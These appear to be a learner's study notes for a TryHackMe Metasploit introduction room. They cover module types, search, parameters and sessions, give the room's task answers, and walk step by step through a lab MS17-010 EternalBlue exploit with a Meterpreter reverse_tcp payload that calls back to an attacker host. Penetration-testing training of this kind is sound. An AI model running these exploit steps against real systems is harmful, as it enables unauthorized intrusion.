# 5.1 - [Metasploit: Introduction](https://tryhackme.com/room/metasploitintro)

## 🔍 Overview
- Metasploit is the **most widely used exploitation framework**.
- Supports all phases of penetration testing: information gathering → scanning → exploitation → post-exploitation.
- Two main versions:
  - **Metasploit Pro**: Commercial, GUI-based, automation features.
  - **Metasploit Framework**: Open-source, command-line (what this room covers).
- Installed on Kali Linux, AttackBox, and most penetration testing distributions.
- Primary interface: `msfconsole`.

---

## 🧩 Core Concepts & Terminology

| Term | Definition |
|------|------------|
| **Exploit** | Code that takes advantage of a vulnerability on the target system. |
| **Vulnerability** | A design, coding, or logic flaw in a system/application. |
| **Payload** | Code that runs on the target system after exploitation (e.g., shell, commands). |

**Task 1 Answers:**
- Code taking advantage of a flaw → `Exploit`
- Code that runs on the target system → `Payload`
- Self-contained payloads called → `Singles`
- Is `windows/x64/pingback_reverse_tcp` singles or staged? → `Singles` (uses `_` not `/` between shell and reverse)

---

## 📂 Metasploit Module Categories

| Category | Purpose |
|----------|---------|
| **Auxiliary** | Supporting modules: scanners, crawlers, fuzzers, etc. |
| **Encoders** | Encode payloads to evade signature-based antivirus (limited success). |
| **Evasion** | Attempt to evade antivirus (more advanced than encoders). |
| **Exploits** | Exploit code organized by target OS (Windows, Linux, Android, etc.). |
| **NOPs** | No Operation instructions (0x90) – used as buffer to achieve consistent payload sizes. |
| **Payloads** | Code that runs on the target system. |
| **Post** | Post‑exploitation modules (privilege escalation, persistence, data gathering). |

### Payload Types (Under Payloads Directory)
| Type | Description |
|------|-------------|
| **Adapters** | Wrap single payloads into different formats (e.g., PowerShell adapter). |
| **Singles** | Self-contained payloads (add user, launch app, etc.) – no additional downloads needed. |
| **Stagers** | Set up communication channel between Metasploit and target. |
| **Stages** | Downloaded by stager; allows larger payloads. |

**Identifying Singles vs. Staged Payloads:**
- **Singles/Inline**: Use `_` between words (e.g., `generic/shell_reverse_tcp`)
- **Staged**: Use `/` between words (e.g., `windows/x64/shell/reverse_tcp`)

## 🖥️ msfconsole Basics

### Launching msfconsole
```bash
msfconsole
```

### Features
- **Tab completion** – auto-completes commands and module paths.
- **Supports Linux commands** – `ls`, `ping`, `clear`, etc.
- **Does NOT support output redirection** – `help > help.txt` fails.
- **Help** – `help` for general help, `help [command]` for specific commands.
- **History** – `history` shows previous commands.

### Prompts
| Prompt | Context |
|--------|---------|
| `root@ip-...:~#` | Regular terminal (no Metasploit commands) |
| `msf6 >` | msfconsole prompt (no module context) |
| `msf6 exploit(...) >` | Module context loaded |
| `meterpreter >` | Meterpreter payload active |
| `C:\Windows\system32>` | Windows shell on target |

## 🔍 Searching for Modules

### Basic Search
```bash
# Search by exploit name, CVE, or target system
search ms17-010
search eternalblue
search apache
```

### Advanced Search Filters
```bash
# Search by module type
search type:auxiliary telnet

# Search by platform
search platform:windows

# Search by CVE
search cve:2017

# Search by name
search name:ssh_login
```

**Search Result Columns:**
- **#** – Index number (use `use #` to select)
- **Name** – Full module path and type
- **Disclosure Date** – When vulnerability was disclosed
- **Rank** – Exploit reliability rating

### Exploit Ranking (Reliability)
| Rank | Description |
|------|-------------|
| **Excellent** | Never crashes, reliable |
| **Great** | Works consistently |
| **Good** | Usually works |
| **Normal** | Works reliably but limited scope |
| **Average** | May not work reliably |
| **Low** | Rarely works or unreliable |
| **Manual** | Requires manual configuration |

### Using Search Results
```bash
# Option 1: Use index number
use 2

# Option 2: Use full path
use exploit/windows/smb/ms17_010_eternalblue
```

### Module Information
```bash
# View detailed info about current module
info

# View info without entering context
info exploit/windows/smb/ms17_010_eternalblue
```

**Task 2 Answers:**
- How to search for Apache modules → `search apache`
- Provider of `auxiliary/scanner/ssh/ssh_login` → (use `info auxiliary/scanner/ssh/ssh_login`)

## ⚙️ Setting Parameters

### Common Parameters
| Parameter | Description |
|-----------|-------------|
| `RHOSTS` | Remote host(s) – IP, CIDR range, or file (`file:/path/to/file.txt`) |
| `RPORT` | Remote port on target system |
| `LHOST` | Local host (attacker machine IP) |
| `LPORT` | Local port for reverse shell |
| `PAYLOAD` | Payload to use with exploit |
| `SESSION` | Existing session ID for post‑exploitation |

### Setting Values
```bash
# Set a parameter
set RHOSTS 10.10.10.10
set LPORT 6666

# Set global value (persists across modules)
setg RHOSTS 10.10.19.23

# Check current settings
show options

# Clear a specific parameter
unset PAYLOAD

# Clear all parameters
unset all

# Clear global value
unsetg RHOSTS
```

### Example: Setting Up MS17-010 EternalBlue
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.165.39
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.44.70
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

**Task 3 Answers:**
- Set LPORT to 6666 → `set LPORT 6666`
- Set global RHOSTS to 10.10.19.23 → `setg RHOSTS 10.10.19.23`
- Clear a set payload → `unset PAYLOAD`
- Proceed with exploitation → `run` or `exploit`

## 💥 Running Exploits

### Commands
```bash
# Run the module (works for exploits and auxiliaries)
run

# Run with background session
exploit -z

# Check if target is vulnerable (if supported)
check
```

### Session Management
Once a vulnerability is exploited, a session is created.

```bash
# List active sessions
sessions

# Interact with session 2
sessions -i 2

# Background session (from meterpreter)
background

# Background session (CTRL+Z)
# Press Ctrl + Z
```

### Example: Exploit with Background Session
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z
[*] Meterpreter session 2 opened
[*] Session 2 created in the background.
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 2
meterpreter > 
```

## 🧰 Practical Lab: MS17-010 EternalBlue

### Setup
- Target: Windows 7 or Server 2008 R2 (x64)
- Vulnerability: SMBv1 kernel pool corruption
- Payload: `windows/x64/meterpreter/reverse_tcp`

### Step-by-Step
```bash
# Launch msfconsole
msfconsole

# Search for the exploit
search ms17-010

# Use the exploit
use exploit/windows/smb/ms17_010_eternalblue

# View required parameters
show options

# Set parameters
set RHOSTS 10.10.165.39
set LHOST 10.10.44.70
set LPORT 4444

# Check if target is vulnerable
check

# Run the exploit
exploit

# If successful, Meterpreter session opens
meterpreter >
```

### Important Notes
- This exploit may cause **system instability/BSOD**.
- Multiple attempts may be needed for success.
- Use **Anonymous login** by default.
- Can provide credentials if SMBUser/SMBPass are set.

## 📊 Module Navigation Flow

```
1. msfconsole → Start console
2. search [keyword] → Find relevant modules
3. use [module] → Enter module context
4. show options → View required parameters
5. set [PARAM] [VALUE] → Configure parameters
6. show options → Verify settings
7. check → Test if target is vulnerable
8. run / exploit → Execute the module
9. sessions → View active connections
10. sessions -i [ID] → Interact with session
11. background → Background session
12. back → Exit module context
```

---

## 🔑 Key Takeaways

- **Metasploit Framework** is open-source, command-line based; **Metasploit Pro** is commercial with GUI.
- **Modules** are organized by type: Auxiliary, Encoders, Evasion, Exploits, NOPs, Payloads, Post.
- **Staged payloads** use `[type]/[payload]/[stager]` format; **Inline** use `[type]/[payload]_[stager]`.
- **setg** and **unsetg** manage global variables across modules.
- **Search** supports filters: `type:`, `platform:`, `cve:`, `name:`.
- **check** can test vulnerability without exploitation.
- **CTRL+Z** backgrounds a session; **sessions -i [ID]** reconnects.
- Always verify parameters with **show options** before running.
